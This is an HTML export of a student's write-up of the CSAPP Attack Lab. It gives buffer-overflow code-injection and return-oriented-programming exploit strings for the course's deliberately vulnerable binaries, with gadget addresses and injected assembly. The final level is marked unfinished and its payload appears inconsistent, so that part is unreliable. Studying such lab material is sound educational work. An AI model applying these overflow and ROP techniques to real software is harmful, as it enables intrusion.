@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>csapp-attack-lab.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="csapp-attack-lab">CSAPP: Attack Lab</h1>
+<p>This video is extremely good to understand exploiting stack buffer overflow. <a href="https://www.youtube.com/watch?v=1S0aBV-Waeo">Buffer Overflow Attack - Computerphile</a></p>
+<p>It is also very important to understand the following stack organzation for a function call. The yellow part is the buffer for callee, in order to overrite into the return statement in blue part, we need to overwrite another 8 bytes. But some assemble code does not use base pointer, so we only need to overwrite another 4 bytes.</p>
+<p><img src="stack-func-call.png" alt=""></p>
+<h3 id="part-i-level-i">Part I, Level I</h3>
+<p>The goal is to when executing <code>getbuf()</code> function, making it return to <code>touch1</code> function.</p>
+<p>Use <code>objdump -d ctarget &gt; ctarget.asm</code> to dissemble the code.</p>
+<p><code>Vim ctarget.asm</code> to check the code.</p>
+<p><img src="getbuf_asm.png" alt=""></p>
+<p>We can find the code <code>sub 0x28, %rsp</code>, which is a stack buffer used to read string from input. So we know that the buffer length is <code>0x28</code>, and the corresponding decimal value is <code>40</code>.</p>
+<p>We can also check the address of <code>touch1</code> code, where we find the address is <code>00000000004017c0</code></p>
+<p><img src="touch1_asm.png" alt=""></p>
+<p>so we need to overwrite another 4 bytes into buffer in order to return <code>touch1</code>, so the total number of bytes is 44.  The last four bytes are <code>00 40 17 c0</code>, and the little endian encoding is <code>c0 17 40 00</code></p>
+<p><img src="touch1_sol.png" alt=""></p>
+<h3 id="part-i-level-2">Part I Level 2</h3>
+<p>The steps to solve this problem.</p>
+<ol>
+<li>Like partI level I, overwrite ret statement to transfer execution into  our injected code.</li>
+<li>Still put injected code into buffer.</li>
+<li>Write injected code</li>
+</ol>
+<p>Injected Assemble Code</p>
+<pre class="hljs"><code><div>mov $0x59b997fa %rdi
+ret
+</div></code></pre>
+<p>Compile it to get bytes representation</p>
+<p><img src="asm-code-b-rep.png" alt=""></p>
+<p>The byte representation is <code>48 c7 c7 fa 97 b9 59 c3</code>, 8 bytes in total.</p>
+<p>And we have 56 bytes in total</p>
+<p>8 bytes for injected code.</p>
+<p>32 bytes for 0 or any other valuess</p>
+<p>8 bytes for return address to injected code</p>
+<p>8 bytes for return address to touch2 code.</p>
+<p>Injected code is stored in the bottom of buffer, so we can use gdb to get the rsp info.</p>
+<p><img src="./rsp_addr_touch2.png" alt=""></p>
+<p>so the answer is</p>
+<pre class="hljs"><code><div>48 c7 c7 fa 97 b9 59 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+ec 17 40 00 00 00 00 00
+</div></code></pre>
+<h3 id="part2-level-3">Part2 level 3</h3>
+<p>Compute a string representation of cookie using ASCII</p>
+<p>The cookie value is <code>0x59b997fa</code></p>
+<p>the ascii bytes are <code>35 39 62 39 39 37 66 61 00</code></p>
+<p>The input string organization is similare to level2.</p>
+<p>first 8 bytes for injected code</p>
+<p>then 9 bytes for cookie string</p>
+<p>23 bytes for any values</p>
+<p>8 bytes to return to injected code</p>
+<p>8 bytes to return to touch3</p>
+<pre class="hljs"><code><div><span class="hljs-number">48</span> c7 c7 <span class="hljs-number">80</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> c3 <span class="hljs-comment">/*injected code address in 5561dc78*/</span>
+<span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-comment">/*cookie string, address in 5561dc80*/</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">/*injected code address*/</span>
+fa <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">/*touch 3 address*/</span>
+</div></code></pre>
+<p>But the above string input is not the right answer. The reason is as following</p>
+<pre class="hljs"><code><div>When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
+portions of memory that held the buffer used by getbuf. As a result, you will need to be careful
+where you place the string representation of your cookie.
+</div></code></pre>
+<p>So we need to change a place to put the cookie string, here , I put cookie string above the touch3 return statement, so we can avoid the cookie string bing overwriten by the rest function calls.</p>
+<pre class="hljs"><code><div><span class="hljs-number">48</span> c7 c7 b0 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> c3 <span class="hljs-comment">/*injected code address in 5561dc78*/</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">/*injected code address*/</span>
+fa <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">/*touch 3 address*/</span>
+<span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-comment">/*cookie string, address in 0x5561dc78 + 0x38 = 0x5561dcb0*/</span>
+</div></code></pre>
+<h3 id="part-ii-level-2">Part II Level 2</h3>
+<p>Intuitively, we need to obtain gadgets to generate the following assemble code.</p>
+<pre class="hljs"><code><div>mov $0x59b997fa %rdi
+ret
+</div></code></pre>
+<p>The most challenging one is to obtain <code>0x59b997fa</code>. The basic solution to obtain this value is making use of <code>pop</code></p>
+<p>So we can convert the above code into gadgets as following</p>
+<pre class="hljs"><code><div><span class="hljs-comment">//getbuf</span>
+...
+ret <span class="hljs-comment">/*return to gadget 1*/</span>
+
+<span class="hljs-comment">// gadget 1</span>
+popq %rax <span class="hljs-comment">/**/</span>
+ret  <span class="hljs-comment">/*return to gadget 2*/</span>
+
+<span class="hljs-comment">// gadget 2</span>
+movq %rax, %rdi
+ret 
+</div></code></pre>
+<p>Obtain gadget 1 assemble as following. We will need <code>58 90 c3</code> with starting address at 0x4019a7 + 4 = <code>0x4019ab</code></p>
+<p><img src="gadget1.png" alt=""></p>
+<p>Obtain gadget 2 assemble as following. We will need <code>48 89 c7 c3</code> with starting address at 0x4019a0 + 2 = <code>0x4019a2</code></p>
+<p><img src="gadge2.png" alt=""></p>
+<p>And then in order to make <code>0x59b997fa</code> pop into %rax, we need to overwrite stack. So in total we need to overwrite the addrees of gadget1, data <code>0x59b997fa</code>,  then address of gadget2 , address of touch2 into stack.</p>
+<pre class="hljs"><code><div><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/*the first 40 bytes*/</span>
+ab <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/*address return to gadget 1*/</span>
+fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/*data to pop into rax in gadget 1*/</span>
+a2 <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/* address return to gadget2 */</span>
+ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/*address return to touch2*/</span>
+</div></code></pre>
+<h3 id="part-ii-level-3">Part II Level 3</h3>
+<p>This lab is unfinished.</p>
+<p>The solution is a combination of Part II level 2 and Part I level 3.</p>
+<p>In this solution, gadgets are the same as Part II level 2.</p>
+<p>The extra thing to consider is to compute the cookie address in stack. But the challenging is that the stack position is randomized. So a possible solution is to use relative position like <code>movq %rsp %rdi</code></p>
+<pre class="hljs"><code><div>movq %rsp %rax
+popq
+ret 
+
+popq (not rax)
+ret 
+
+movq %rax %rdi
+ret
+</div></code></pre>
+<pre class="hljs"><code><div><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>
+<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/*the first 40 bytes*/</span>
+ab <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/*address return to gadget 1*/</span>
+fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/*data to pop into rax in gadget 1*/</span>
+a2 <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/* address return to gadget2 */</span>
+fa <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-comment">/*address return to touch2*/</span>
+<span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span>  <span class="hljs-comment">/*cookie string here */</span>
+</div></code></pre>
+
+</body>
+</html>
